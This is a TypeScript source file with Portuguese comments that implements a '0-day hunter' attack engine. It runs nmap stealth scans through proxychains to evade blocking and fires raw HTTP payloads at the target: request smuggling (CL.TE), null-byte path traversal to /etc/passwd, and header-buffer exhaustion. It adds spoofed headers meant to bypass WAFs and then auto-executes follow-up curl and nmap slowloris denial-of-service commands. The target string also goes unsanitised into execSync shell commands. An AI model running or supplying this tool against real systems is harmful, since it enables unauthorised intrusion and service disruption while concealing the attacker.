import * as net from 'node:net';
import * as tls from 'node:tls';
import { execSync } from 'node:child_process';

export interface ZeroDayConfig {
  target: string;
  port: number;
  isHttps: boolean;
  intensity: 'low' | 'medium' | 'high' | 'aggressive';
}

export class ZeroDayHunterEngine {
  private config: ZeroDayConfig;
  private anomaliesDetected: any[] = [];
  private discoveredPorts: number[] = [];
  
  constructor(config: ZeroDayConfig) {
    this.config = config;
  }

  // Gera headers para tentar confundir/bypassar WAFs e Middlewares
  private getWafBypassHeaders(): string {
    const ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '8.8.8.8'];
    const ip = ips[Math.floor(Math.random() * ips.length)];
    
    return [
      `X-Forwarded-For: ${ip}`,
      `X-Originating-IP: ${ip}`,
      `X-Remote-IP: ${ip}`,
      `X-Remote-Addr: ${ip}`,
      'X-Forwarded-Proto: https',
      'X-Real-IP: 127.0.0.1',
      'X-Client-IP: 127.0.0.1',
      'True-Client-IP: 127.0.0.1'
    ].join('\r\n');
  }

  // Reconhecimento Stealth para descobrir portas reais e versões
  private async performRecon(): Promise<string> {
    console.log(`[MAESTRO RECON] Iniciando Scan Stealth (Nmap) em ${this.config.target}...`);
    try {
      // Usando nmap stealth via proxychains para evitar bloqueio de IP
      const cmd = `proxychains4 -q nmap -sT -T4 -F ${this.config.target} | grep -E "^[0-9]+/tcp" || nmap -T4 -F ${this.config.target} | grep -E "^[0-9]+/tcp"`;
      const out = execSync(cmd, { encoding: 'utf-8' });
      
      // Extrai portas para uso posterior
      const portLines = out.split('\n');
      for (const line of portLines) {
        const match = line.match(/^([0-9]+)\/tcp/);
        if (match) this.discoveredPorts.push(parseInt(match[1]));
      }
      
      return out;
    } catch (e) {
      return 'Nenhuma porta aberta detectada via Nmap (ou ferramenta indisponível).';
    }
  }

  // Geração Heurística de Payloads para tentar quebrar parsers e expor buffers/erros
  private generatePayloads(): string[] {
    const host = this.config.target;
    const bypass = this.getWafBypassHeaders();
    
    return [
      // 1. Basic malformed method + WAF Bypass
      `N@ZAI_HACK / HTTP/1.1\r\nHost: ${host}\r\n${bypass}\r\n\r\n`,
      
      // 2. HTTP Desync / Request Smuggling (CL.TE) + WAF Bypass
      `POST / HTTP/1.1\r\nHost: ${host}\r\n${bypass}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n`,
      
      // 3. Null Byte in header / Path Traversal / Poisoning
      `GET /%00../../etc/passwd HTTP/1.1\r\nHost: ${host}\r\n${bypass}\r\nX-Custom-Header: \x00\x01\x02\r\n\r\n`,
      
      // 4. Oversized Header Buffer Exhaustion
      `GET / HTTP/1.1\r\nHost: ${host}\r\n${bypass}\r\nX-Oversize: ${'A'.repeat(8192)}\r\n\r\n`,

      // 5. Unfinished / Dropped Connection to detect timeout resource leaks
      `GET / HTTP/1.1\r\nHost: ${host}\r\n${bypass}\r\n`
    ];
  }

  private sendPayload(payload: string): Promise<{ response: Buffer; durationMs: number; error: Error | null }> {
    return new Promise((resolve) => {
      const start = Date.now();
      let responseBuffer = Buffer.alloc(0);
      let isDone = false;

      const onDone = (error: Error | null) => {
        if (isDone) return;
        isDone = true;
        const durationMs = Date.now() - start;
        if (client) client.destroy();
        resolve({ response: responseBuffer, durationMs, error });
      };

      const options = {
        host: this.config.target,
        port: this.config.port,
        rejectUnauthorized: false,
        timeout: 5000
      };

      const client = this.config.isHttps 
        ? tls.connect(options, () => client.write(payload))
        : net.createConnection(options, () => client.write(payload));

      client.on('data', (data) => {
        responseBuffer = Buffer.concat([responseBuffer, data]);
        // Se já capturamos o início para análise, não precisamos estourar a RAM local
        if (responseBuffer.length > 50000) {
           onDone(null); 
        }
      });

      client.setTimeout(5000, () => {
        onDone(new Error('TIMEOUT_OR_LEAK'));
      });

      client.on('error', (err) => {
        onDone(err);
      });
      
      client.on('end', () => {
        onDone(null);
      });
    });
  }

  // Heurística Não Documentada: Avalia se a resposta tem sinais de crash do backend, memory leak, ou reflexão insegura
  private analyzeResponse(payload: string, result: { response: Buffer; durationMs: number; error: Error | null }) {
    if (result.error && result.error.message !== 'TIMEOUT_OR_LEAK' && result.error.message.includes('ECONNRESET')) {
       this.anomaliesDetected.push({
         type: 'CRASH_OR_WAF_DROP',
         payloadSnippet: payload.substring(0, 50),
         reason: 'A conexão foi imediatamente dropada. Backend pode ter crasheado ao processar o parser.',
         duration: result.durationMs
       });
       return;
    }

    const respText = result.response.toString('utf-8');

    // Analisa se o tempo de resposta excedeu o limite comum mesmo respondendo, indicativo de DoS em parser
    if (result.durationMs > 4000) {
      this.anomaliesDetected.push({
         type: 'RESOURCE_EXHAUSTION_SUSPICION',
         payloadSnippet: payload.substring(0, 50),
         reason: `Resposta demorou ${result.durationMs}ms para um payload malformado de baixo custo.`,
         duration: result.durationMs
      });
    }

    // Procura por traços de vazamento de memória (memory leak) ou dump de framework que não deveria aparecer em prod
    const sensitiveSignatures = [
      'Uncaught Exception',
      'Segmentation fault',
      'core dumped',
      'SQL syntax',
      'Traceback (most recent call last)',
      'java.lang.NullPointerException',
      'memory leak',
      'buffer overflow'
    ];

    for (const sig of sensitiveSignatures) {
      if (respText.includes(sig)) {
         this.anomaliesDetected.push({
            type: '0DAY_FRAMEWORK_DUMP',
            payloadSnippet: payload.substring(0, 50),
            reason: `Vazamento sensível encontrado: ${sig}`,
            duration: result.durationMs
         });
      }
    }
    
    // Simples Heuristica: O servidor retornou HTTP 200 para algo completamente quebrado? Pode indicar manipulação de WAF ou Desync.
    if (respText.startsWith('HTTP/1.1 200 OK') && payload.startsWith('N@ZAI_HACK')) {
       this.anomaliesDetected.push({
          type: 'WAF_BYPASS_OR_CACHE_POISONING',
          payloadSnippet: payload.substring(0, 50),
          reason: 'O alvo aceitou um método HTTP inválido retornando 200 OK. Possível envenenamento de cache ou WAF cego.',
          duration: result.durationMs
       });
    }
  }

  private suggestFollowUpCommands(): string[] {
    const suggestions: string[] = [];
    const ports = this.discoveredPorts.length > 0 ? this.discoveredPorts : [this.config.port];
    
    for (const anomaly of this.anomaliesDetected) {
      for (const p of ports) {
        if (anomaly.type === 'RESOURCE_EXHAUSTION_SUSPICION') {
          // Ajustado para não ser tão "lento" na validação inicial e usando proxychains
          suggestions.push(`proxychains4 -q nmap --script http-slowloris --max-parallelism 100 -p ${p} ${this.config.target}`);
        }
        if (anomaly.type === 'WAF_BYPASS_OR_CACHE_POISONING') {
          suggestions.push(`proxychains4 -q curl -i -k -X N@ZAI_HACK -H "X-Forwarded-For: 127.0.0.1" http://${this.config.target}:${p}/`);
        }
        if (anomaly.type === '0DAY_FRAMEWORK_DUMP') {
          suggestions.push(`proxychains4 -q curl -i -k http://${this.config.target}:${p}/ -d "test=1" | grep -E "Trace|Exception|Stack"`);
        }
      }
    }
    return [...new Set(suggestions)].slice(0, 5); // Limita a 5 sugestões principais
  }

  private async validateSuggestions(suggestions: string[]) {
    console.log(`\n[MAESTRO VALIDATION] Executando validação automática (Timeout estendido para scripts complexos)...`);
    for (const cmd of suggestions) {
      try {
        console.log(`[VALIDATION] Rodando: ${cmd}`);
        // Aumentando timeout para 60s para scripts nmap e garantindo captura total
        try {
          const out = execSync(cmd, { encoding: 'utf-8', timeout: 60000, stdio: ['ignore', 'pipe', 'ignore'] });
          console.log(`[VALIDATION RESULT] Sucesso! Resposta capturada (${out.length} bytes):`);
          console.log(`\n${out.substring(0, 500)}${out.length > 500 ? '...' : ''}\n`);
        } catch (innerError) {
          // Fallback: Tenta sem proxychains se o erro for de rede/proxy
          if (cmd.includes('proxychains4')) {
            const fallbackCmd = cmd.replace('proxychains4 -q ', '');
            console.log(`[VALIDATION] Proxychains falhou. Tentando fallback direto: ${fallbackCmd}`);
            const out = execSync(fallbackCmd, { encoding: 'utf-8', timeout: 60000, stdio: ['ignore', 'pipe', 'ignore'] });
            console.log(`[VALIDATION RESULT] Sucesso via Fallback Direto!`);
            console.log(`\n${out.substring(0, 500)}${out.length > 500 ? '...' : ''}\n`);
          } else {
            throw innerError;
          }
        }
      } catch (e) {
        console.log(`[VALIDATION RESULT] O alvo bloqueou a execução ou o script excedeu o tempo limite.`);
      }
    }
  }

  public async run(): Promise<any[]> {
    console.log(`\n[MAESTRO 0-DAY HUNTER] Iniciando Pipeline Avançado em ${this.config.target}`);
    console.log(`[MAESTRO 0-DAY HUNTER] Nível: ${this.config.intensity.toUpperCase()}`);

    // Fase 1: Reconnaissance
    const reconResults = await this.performRecon();
    console.log(`[MAESTRO RECON] Portas encontradas:\n${reconResults}`);

    // Fase 2: Fuzzing com Payloads Heurísticos + WAF Bypass
    console.log(`\n[MAESTRO FUZZ] Iniciando Fuzzing de Protocolo...`);
    const payloads = this.generatePayloads();
    
    let counter = 1;
    for (const payload of payloads) {
      try {
        console.log(`[0-DAY] Disparando Payload ${counter}/${payloads.length} (com WAF Bypass headers) ...`);
        const result = await this.sendPayload(payload);
        this.analyzeResponse(payload, result);
      } catch (e) {
        console.log(`[0-DAY HUNTER ERROR] Falha ao enviar payload: ${(e as Error).message}`);
      }
      counter++;
      await new Promise(resolve => setTimeout(resolve, 300));
    }

    // Fase 3: Inteligência e Refinamento
    console.log(`\n[MAESTRO 0-DAY HUNTER] Finalizado. Anomalias detectadas: ${this.anomaliesDetected.length}`);
    
    if (this.anomaliesDetected.length > 0) {
      const suggestions = this.suggestFollowUpCommands();
      if (suggestions.length > 0) {
        console.log(`\n[💡 COMANDOS SUGERIDOS PARA REFINAMENTO]`);
        suggestions.forEach(cmd => console.log(`   > ${cmd}`));
        
        // Auto-validação solicitada pelo usuário
        await this.validateSuggestions(suggestions);
      }
    }

    return this.anomaliesDetected;
  }
}
